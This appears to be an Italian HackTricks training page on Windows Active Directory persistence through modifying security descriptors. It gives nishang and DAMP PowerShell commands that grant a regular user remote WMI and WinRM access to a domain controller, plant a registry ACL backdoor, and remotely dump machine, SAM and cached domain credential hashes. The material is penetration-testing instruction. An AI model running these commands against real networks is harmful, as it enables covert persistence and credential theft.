# Descrittori di sicurezza

{{#include ../../banners/hacktricks-training.md}}

## Descrittori di sicurezza

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) definisce il formato utilizzato per descrivere un descrittore di sicurezza. SDDL utilizza stringhe ACE per DACL e SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

I **descrittori di sicurezza** vengono utilizzati per **memorizzare** le **autorizzazioni** che un **oggetto** possiede **su** un **oggetto**. Se riesci semplicemente ad apportare una **piccola modifica** al **descrittore di sicurezza** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza dover essere membro di un gruppo privilegiato.

Quindi, questa tecnica di persistence si basa sulla capacità di ottenere ogni privilegio necessario su determinati oggetti, così da poter eseguire un'attività che normalmente richiede privilegi admin, ma senza dover essere admin.

### Accesso a WMI

Puoi concedere a un utente l'accesso per **eseguire WMI da remoto** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Accesso alla console PS di WinRM per un **utente**

Concedi l'accesso alla **console PS di WinRM a un utente** [**usando questo**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Accesso remoto agli hash

Accedere al **registry** ed eseguire il **dump degli hash** creando una **Reg backdoor usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** in modo da poter recuperare in qualsiasi momento l'**hash del computer**, il **SAM** e qualsiasi credenziale **AD** in cache nel computer. È quindi molto utile concedere questa autorizzazione a un **regular user su un computer Domain Controller**:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Controlla [**Silver Tickets**](silver-ticket.md) per scoprire come potresti usare l'hash dell'account computer di un Domain Controller.

## Riferimenti

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
